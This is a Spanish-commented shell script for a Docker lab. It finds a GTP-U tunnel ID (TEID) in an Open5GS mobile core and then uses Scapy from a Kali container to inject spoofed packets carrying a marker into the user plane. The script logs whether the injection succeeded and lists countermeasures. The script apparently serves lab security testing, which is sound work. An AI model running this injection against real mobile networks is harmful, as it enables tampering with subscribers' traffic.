#!/bin/sh
# ============================================================================
# v6_gtp.sh — V6 Inyección GTP-U (TEID conocido, Scapy).
# Requiere plano de usuario GTP operativo (lab-up.sh paso 13: ogstun UP +
# llamada/datos en ventana CONNECTED post-attach; en IDLE el MME rechaza
# Service Request causa 9 y no hay TEID válido).
# Fases: 1-descubrir TEID (logs SMF/UPF o captura ogstun) 2-inyectar 3-verificar.
# Uso: ./v6_gtp.sh  (TEID=0 hace solo descubrimiento y sale 2 = bloqueado)
# ============================================================================
set -eu
cd "$(dirname "$0")/.."
export MSYS_NO_PATHCONV=1

log() { echo "[v6] $*"; }
ask() {
  printf "%s [%s]: " "$2" "$3" >&2
  read -r ans || ans=""
  [ -n "$ans" ] || ans="$3"
  echo "$ans"
}

docker ps --format "{{.Names}}" 2>/dev/null | tr -d '\r' | grep -qx kali \
  || { log "ERROR: kali no corre (docker compose up -d kali)"; exit 1; }
mkdir -p results; touch results/hashes.txt 2>/dev/null || true
TS=$(date -u +%Y%m%dT%H%M%SZ)

# --- Fase 1: descubrir TEID ---
log "F1: candidatos TEID (SMF/UPF logs + captura ogstun 15s)..."
docker logs open5gs 2>&1 | grep -a -iE "teid" | tail -n 5 || log "(sin TEID en logs open5gs)"
log "Captura breve ogstun buscando GTP-U (requiere tráfico de usuario activo)..."
docker exec -d open5gs sh -c "timeout 15 tcpdump -i ogstun -w /tmp/v6disc.pcap udp port 2152 >/dev/null 2>&1"
sleep 16
docker exec open5gs sh -c "tshark -r /tmp/v6disc.pcap -T fields -e gtp.teid 2>/dev/null | sort -u | head -n 5" || true

TEID=$(ask TEID "TEID de sesión objetivo (0 = solo descubrir)" "0")
DST=$(ask DST "IP destino encapsulado (eNB/SGW)" "172.20.0.4")
INNER=$(ask INNER "IP interna destino (UE/tun)" "10.45.0.2")
if [ "$TEID" = "0" ]; then
  log "Sin TEID válido: primero establecer llamada/datos por GTP."
  log "Desbloqueo:"
  log "  1. ./lab-up.sh (paso 13: ogstun UP + keepalive + sip_listen al tun)."
  log "  2. Llamada activa 1001->1000 y, en ventana CONNECTED, capturar:"
  log "     docker exec open5gs tshark -i ogstun -Y gtp -T fields -e gtp.teid | sort -u"
  log "  3. Re-ejecutar ./v6_gtp.sh con ese TEID."
  log "  4. Scapy: IP()/UDP(dport=2152)/GTP_U_Header(teid=TEID)/IP()/UDP()/Raw()"
  exit 2
fi

# --- Fase 2+3: inyectar + verificar ---
PCAP="/root/results/v6_gtp_TEID${TEID}_$TS.pcapng"
log "Verificación: captura ogstun 30s para ver el marcador V6-INJECT..."
docker exec -d open5gs sh -c "timeout 30 tcpdump -i ogstun -w /tmp/v6_$TS.pcap udp port 2152 >/tmp/v6cap.log 2>&1"
sleep 2
log "Inyectando 5 pkt en TEID $TEID hacia $DST (inner $INNER)..."
docker exec -e TEID="$TEID" -e DST="$DST" -e INNER="$INNER" kali python3 -c "
import os
from scapy.all import IP, UDP, Raw, send
from scapy.contrib.gtp import GTP_U_Header
teid = int(os.environ['TEID']); dst = os.environ['DST']; inner = os.environ['INNER']
pkt = IP(dst=dst)/UDP(dport=2152)/GTP_U_Header(teid=teid)/IP(dst=inner)/UDP(dport=9999)/Raw(b'V6-INJECT')
send(pkt, count=5, verbose=0)
print('inyectado TEID=%d -> %s' % (teid, dst))
"
sleep 28
docker cp open5gs:/tmp/v6_$TS.pcap "/tmp/v6_$TS.pcap"
cp "/tmp/v6_$TS.pcap" "results/v6_gtp_TEID${TEID}_$TS.pcapng" 2>/dev/null || true
docker cp "/tmp/v6_$TS.pcap" "kali:/root/results/v6_gtp_TEID${TEID}_$TS.pcapng" 2>/dev/null || true
HIT=$(docker exec kali sh -c "tshark -r $PCAP -Y 'data contains V6-INJECT or udp.port==9999' 2>/dev/null | wc -l" || echo 0)
log "Paquetes con marcador V6-INJECT en captura: $HIT"
H=$(docker exec kali sh -c "sha256sum $PCAP | cut -d' ' -f1")
echo "$H  v6_gtp_TEID${TEID}_$TS.pcapng  V6  $(date -u +%Y-%m-%dT%H:%M:%SZ)  inject TEID $TEID -> $DST (hits $HIT)" >> results/hashes.txt
log "hash registrado."
if [ "${HIT:-0}" -gt 0 ]; then
  log "VEREDICTO: VULNERABLE (GTP-U aceptó paquetes con TEID conocido)."
else
  log "VEREDICTO: revisar manual (el TEID puede ser direccional o la ventana CONNECTED expiró; reintentar con llamada activa)."
fi
log "F4 contramedida: filtrado GTP-C/U + TEID aleatorios + firewall S1-U (solo eNB legítimo) -> re-ejecutar -> 0 hits."
